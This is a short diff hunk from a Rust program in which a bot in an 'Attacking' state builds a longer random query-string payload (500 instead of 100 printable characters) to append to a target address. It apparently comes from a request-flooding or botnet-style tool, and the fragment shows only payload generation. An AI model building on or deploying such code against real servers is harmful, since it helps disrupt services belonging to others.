@@ -30,8 +30,8 @@ fn main() {
                     },
                     BotState::Attacking(addr) => {
                         let mut payload = String::with_capacity(addr.len()+100);
-                        for _ in 1..100 {
-                            let c = rng.random_range(3..=126) as u8 as char;
+                        for _ in 1..500 {
+                            let c = rng.random_range(33..=126) as u8 as char;
                             payload.push(c);
                         }
                         let target = format!("{addr}?q={payload}");
